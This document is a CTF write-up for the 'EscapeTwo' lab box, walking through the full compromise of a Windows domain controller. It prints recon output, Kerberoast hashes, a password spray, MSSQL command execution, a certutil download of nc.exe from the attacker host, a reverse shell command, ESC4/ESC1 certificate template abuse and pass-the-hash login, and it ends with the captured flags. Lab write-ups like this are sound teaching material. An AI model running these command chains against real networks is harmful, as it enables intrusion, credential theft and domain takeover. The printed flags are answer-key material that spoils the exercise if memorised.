
# CTF Writeup: EscapeTwo

---

We are provided with the credentials:

```
rose:KxEPkKe6R8su
```
## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sS -p- 10.129.232.128    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 06:25 -0500
Nmap scan report for 10.129.232.128
Host is up (0.032s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49694/tcp open  unknown
49695/tcp open  unknown
49710/tcp open  unknown
49726/tcp open  unknown
49736/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 107.32 seconds
```

An more detailled scan revealed further informations about the services running.

```
nmap -n -Pn -sSCV -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49694,49695,49710,49726,49736 10.129.232.128
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 06:28 -0500
Nmap scan report for 10.129.232.128
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-18 11:28:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-06-18T11:29:54+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2026-06-18T11:29:54+00:00; 0s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.232.128:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-06-18T11:25:17
|_Not valid after:  2056-06-18T11:25:17
| ms-sql-ntlm-info: 
|   10.129.232.128:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-06-18T11:29:54+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-18T11:29:54+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-18T11:29:54+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:46:45
|_Not valid after:  2124-06-08T17:00:40
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-18T11:29:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.96 seconds
```

We get information about Kerberos & LDAP running, so we assume this box is an Domain Controller. 

We also get the information provided about an domainname called "sequel.htb", let's map this to the target ip address in our local dns file.

```
echo "10.129.232.128 sequel.htb" | tee -a /etc/hosts
```

We enumerated SMB Shares using the provided domain credentials.

There seems to be two non-default "Users" & "Accounting Department" Share. Let's check it out.

```
smbclient -L \\\\sequel.htb -U rose
Password for [WORKGROUP\rose]:

        Sharename       Type      Comment
        ---------       ----      -------
        Accounting Department Disk      
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to sequel.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Users Share, doesn't seem very promising let's check the Accounting one out.

```
smbclient \\\\sequel.htb/"Accounting Department" -U rose 
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 05:52:21 2024
  ..                                  D        0  Sun Jun  9 05:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 05:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 05:52:07 2024

                6367231 blocks of size 4096. 927834 blocks available
smb: \>
```

There is two .xlsx files inside. But they seem to be encrypted I can't view them with libreoffice also unzipping them only gave us information about an binary.

Moved onto ldap.

```
ldapsearch -H "ldap://sequel.htb" -D rose@sequel.htb -w 'KxEPkKe6R8su' -b "dc=sequel,dc=htb" "*" > ldapsearch.txt
```

There seems to be two more users besides "rose". "ryan" & "sql_svc".

I sprayed credentials and found out that our current user "rose" can connect to MSSQL.

```
impacket-mssqlclient rose:'KxEPkKe6R8su'@sequel.htb -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SEQUEL\rose  guest@master)>
```

We tried to enumerate available databases, but found out that there only seems to be default databases. My intuition tells me that this means how we get shell could be through xp_cmdshell or other stuff.

```
SQL (SEQUEL\rose  guest@master)> SELECT name FROM sys.databases;
name     
------   
master   
tempdb   
model    
msdb
```

Unfortunately we can't activate xp_cmdshell.

```
SQL (SEQUEL\rose  guest@master)> EXEC sp_configure 'show advanced options', '1';
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
```

Since I wasn't able to properly proceed or find anything, I moved on with downloading domain information with bloodhound & our credentials.

```
bloodhound-python -u "rose" -p "KxEPkKe6R8su" -ns 10.129.232.128 -d sequel.htb -c all
```

I then started up bloodhound & uploaded the domain information onto there and found two kerberoastable users.

```
sql_svc
ca_svc
```

Performed Kerberoasting with the provided credentials and gained the TGT Hash for user sql_svc & ca_svc.

```
impacket-GetUserSPNs -request -dc-ip 10.129.232.128 sequel.htb/rose
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName     Name     MemberOf                                              PasswordLastSet             LastLogon                   Delegation 
-----------------------  -------  ----------------------------------------------------  --------------------------  --------------------------  ----------
sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb  2024-06-09 02:58:42.689521  2026-06-18 06:25:14.358544             
sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb          2026-06-18 07:57:28.773275  2024-06-09 12:14:42.333365             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$2e5290968f23f78f04d3e5c884a95dcb$0260522d338c19dd5768f2fb5494e75f69b4a65e86bf2594d57235b42f879c04b93769fc5841969dd443db2449d1bcac7519191f3e4adad030e5c13a7a4fd6d1bb8c65d18602bdac10c40905caa2fa6498fd8b122f44e98924965e7c393d10e58ccac822c53af48df96b86a54fe47db147fa3c97a1115767dc7abcb140e16ac477de2e4a833b17745dbb764560efaa46c08f4040d7bd6005a654d2eb3b1ea5979ddc776747870b997054f467e2a10d493ba3fa6c0ef733e12534a46950439562183bd1054fea6c485e24dd3fe09e50b1d83448985bdb5a30f31855eb8e89553b9bfbf20ff84d87a73d492796c850c7c070c92e23cf840a18108c64cc9349e8d45aa2cb319620a2c347e6eb4193c50bfb0ad379831889264ab6ac08a6601ae7da657f587a95029768adb0d572e8317dab93e50e5cc0b0e709924487fcdc130b6715c6969f60a26a650d03dbe97abdfc8cb23877aa7d85115dce8dad833eba25cbda210872bfc792c7102d5b814ba0634c4cea546e17cb41cb2b1c9bd505436a9d5366586d36aac33ba32c8b9ccf9d137e43e505cef3eae0d93f1cc9c8e85c8da53989011e1f1d57b5c38f86aeda8a120f1864966a593a57d05c5f85bcf375daa5e9a890bf7eb1181f1a8446bc500a99072ad99dfd833610992e193e564a80f4c44007958d21fc51d42c290b6ba05d9743fbb6dd9156777c3713848559ece07f29c5c5c96ebf9eb372759d6c565b4cf4154eb458b5db6e10908bb075420c81895a7dea4c1b2a3aef442928e0d55c078b01054b1d2930c7dacd107632fe511c88baff26dc659b218b385e572e527600f6fdae4ae4dafa9a9387180039f7b108b88031aa49492ff2f27cfeb0b2332c9259e9054803ee5f0939206f89c42a60329893ab9314c0a7fff4337bcad7189b24b2bd7f9fcc5e2a377b2304f3fdef28e73dac2e84347e5ac5546da0d0f716c50643494a4a4f315377bece95a82700c9b05ec7bfbdb231390bfcbb14a31b3c45826d832242c44383f33c01e32e5b2a2aa21a6c68452bc7ce785ba2449bec22f973eaa53990c1d020063aab58995be84ddf1eaf52f72ed5efb8c41c56b2bc680e15cb35b2ad5235af8a29c56014864e9d37cca9ddb73dd0188c7e5cf209255501e2982f539009d9b0fc864e9f5f66051799ca736a5cd9f8034a2bf25af36f13434f9e28f837963289d28c3bcd475f74146a8850b6b12181aefd3ff4c9692f680d2c9c36e0c653d61cf4b67d002123e91b9ba8632f225c38a9f080941c56e380f9fb1b34e8dc44ccf22e7959349b2e6ded28a76807747b1b370dcd8bb792ef373603c01974cfc9e3299bb13ccf14524617999c16b096881f17b8f8bcf11fa2b0569f2d1b715cb745190acb0468a651cbd9f1fffc40ed1ce0e5e67d6a4557944fb7ea49
$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$67d09cdf221502693bf5a9214bab6716$bd3cb24a77dce80e68757acbbd8e150a8860e8915ad595799607246573376d67b1dbf70bedcea626b49cc799b8f2c3fc8fd81b34dccb0a767d9222471326972aad0db425d3c54dbdaa7a2a521ca86ad2edaf64f7a6674e5682e4a6d563eced700e50e3a84f72dfcd7edc67f8d5aa399adedada0464413188fd2633baffd4f2d904dac9b59f1bb12c1c39dba0e39770bff80da29f76ed73faa4f2afed492a4c9a2a698ca87fabcfa1c42a12e0c29f64fb12482f93e5ee5fae922328159739b17b1d384952190438989fd8c582b02d2b2bdddca5d2e252c38b7b022fae400632adc1fe342c6f83bb2a2721e255ee5151550cb308a7a57106ce74595ef925f1eae1132418b8f7b6d558943b7fb3672c7a50893eb5052a0cc3ef932ec8d13e6e02c9ba65b21b6fae0ee7a2504e33ba988aa284339c4c467e6ec741dd4b50bfc55c557ad9323c957c00fd19a87132366b2fef8715e036506143d087ef85cd796cd7d9a902720ed301c095b943ee2848a4027b406be20760b34d61e4946bb881aec23de3957c4ae078bad998f0033fe1d425f67a507f7137f169e803680ae35437d84b985e4305dbe74a2b6f76352d7c7656a049fa7c06c5c2c7a64f02729cd9725e84dbb7585f192beeb90c0acbaecc9c657a38d27f175476ee284d4eed69add0884125b7dd8c6a2794104063f3f0544943e61e205734485a0ea47012dfe4ca6eec27accd3e6545e45f2fcca0cc6fd7d677cbdfce7324eae19a70424e5eedb1937b98e86a65ac2b7fb9be0823700ba013a7d788825496fe2d193111cc5e32409ac285e61533a6193f9b749bed96a7bc724e8845e735391f8048a458ea6aaf830d2e547f7ddbddb115631ae5ed41eb489fc4bf7aed85248462f39d5c4a932de25eb0b0e0a3b36e1b3cb1f36c59a2fa12556f91d8650f921742b32a8de593786174599f4e8ebdf6ea047e2d9d646d3d8e75752f80e7d10dcbd4bc72ac7ac0278806148421d5fd9c02cc69ef818915e7a4e341b04c3a978c0aac73e71568c223983b091cc0d3804e8bc62372f8f3b83ebddc323b535f8718220649c4ba29410d1ffcb4e8c2f24988bc409884a8d49d167bdf73229340513a1bdd0fdc49c940fc3e500af57c050780fe22511a8fa3aacfc3855b7ef8459ba3afd79d55a6bc8411a5ce3eee5f9809954d5744f33e096721c8c2c91c05d7295d8417374314b8d303e3ff8619d4c60f99e35320b8d0dc5969730cddd006c4fd2215a3541e5cce6ce1ee6e39502866c9cf2c542c2664ae175be6cada45eb8eaceef054367750557194003a2c635ed345facd0797c74c6a884e371cb1cea20cccd7a73062c97517baf80c7f590605399625d80342082613e9d814284435a3c521b7b6bac91f95e576d998ff2937fa5fc3f3d597c233b340868f2cdf4e
```

Since I fell into multiple rabbitholes, I had to start freshly and looked up how to move on. I then read that the way of unzipping the discovered .xlsx files was the correct path. Let me analyze them again. And this is where I realised where I fked it up. I forgot to unzip the 2nd file "accounts.xlsx".

```
unzip accounts.xlsx
cat sheet1.xml
cat sharedStrings.xml
```

Discovered multiple potential passwords and usernames:

```
angela:0fwz7Q4mSpurIt99
oscar:86LxLBMgEWaKUnBG
kevin:Md9Wlq1E5bZnVDVo
sa:MSSQLP@ssw0rd!
```

I stored them inside my users.txt and passwords.txt and sprayed again.

```
nxc smb sequel.htb -u users.txt -p passwords.txt --continue-on-success
```

Running the command revealed another set of valid domain creds for user "oscar".

```
oscar:86LxLBMgEWaKUnBG
```

We also found MSSQL Admin Credentials. Which means we should have command execution.

```
nxc mssql sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth
MSSQL       10.129.232.128  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb) (EncryptionReq:False)
MSSQL       10.129.232.128  1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```

Verifying that we do got Command Execution:

```
nxc mssql sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'whoami'
MSSQL       10.129.232.128  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb) (EncryptionReq:False)
MSSQL       10.129.232.128  1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.129.232.128  1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.129.232.128  1433   DC01             sequel\sql_svc
```

I started up an python3 webserver on my local machine in the directory in which "nc.exe" is stored.

```
python3 -m http.server 80
```

I then downloaded the .exe onto the target system.

```
nxc mssql sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'certutil -urlcache -split -f http://10.10.15.9/nc.exe C:\Windows\Temp\nc.exe'
MSSQL       10.129.232.128  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb) (EncryptionReq:False)
MSSQL       10.129.232.128  1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.129.232.128  1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.129.232.128  1433   DC01             ****  Online  ****
MSSQL       10.129.232.128  1433   DC01             0000  ...
MSSQL       10.129.232.128  1433   DC01             e800
MSSQL       10.129.232.128  1433   DC01             CertUtil: -URLCache command completed successfully.
```

I started up an listener on my local machine.

```
rlwrap nc -lvnp 443
```

Executed the following command:

```
nxc mssql sequel.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'C:\Windows\Temp\nc.exe 10.10.15.9 443 -e cmd.exe'
```

Gained RCE as user "sql_svc".

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.232.128] 49160
Microsoft Windows [Version 10.0.17763.6640]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

I navigated into the SQL2019 Directry and found an interesting config file.

```
type sql-Configuration.INI
```

It provided me a new password:

```
WqSZAF6CysDQbGb3
```

Could this be the password for user "ryan"? Since he is the only other user which has an directory on the DC. Tested it out with nxc.

```
nxc mssql sequel.htb -u users.txt -p passwords.txt --continue-on-success
```

Yes! It seems so. I sprayed winrm to check if we can access it like this and we pwned it!

```
nxc winrm sequel.htb -u users.txt -p passwords.txt --continue-on-success
```

I marked all users as pwned in bloodhound and analyzed what I can do. User "ryan" has "OwnerWrite" over "ca_svc". The account itself is the service account of the internal certificate authority. Upon viewing shortest path to escalate privs I see that an "ESC4" Attack is available.

So ryan -> OwnerWrite -> ca_svc -> ESC4 -> Administrator

I began with OwnerWrite.


1. Becoming the owner of service account "ca_svc". Now user "ryan" (current user) owns this service account.

```
/usr/share/doc/python3-impacket/examples/owneredit.py -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

2. Giving GenericAll for "ryan" over "ca_svc".

```
/usr/share/doc/python3-impacket/examples/dacledit.py -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

3. Get NTLM Hash for user "ca_svc".

```
certipy-ad shadow auto -username ryan@sequel.htb -password WqSZAF6CysDQbGb3 -account ca_svc -dc-ip 10.129.232.128 
```

Certificate Priv Esc which modifies an Certificate Template. Which we can then use to exploit it to elevate privs.

1. This checks which cert is vulnerable (since there is many)

```
certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vuln
```

2. Comprimise the certificate template, which allows us to perform an ESC1 Attack after.

```
certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
```

3. Perform ESC1 Attack.

This command requests a certificate file "administrator.pfx" for the user Administrator by using ca_svc credentials to impersonate that user's UPN with the "DunderMifflinAuthentication" template.
```
certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -target dc01.sequel.htb -target-ip 10.129.232.128
```

4. Get NTLM Hash of Administrator User

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.128
```

5. Logged into the DC

```
impacket-psexec Administrator@sequel.htb -hashes aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

Retrieved user.txt in C:\Users\ryan\Desktop

```
bcde134a6f95cf951f5f5afece5b965c
```

Retrieved root.txt in C:\Users\Administrator\Desktop

```
97f50917b4dd1a5fec301846c8b761cc
```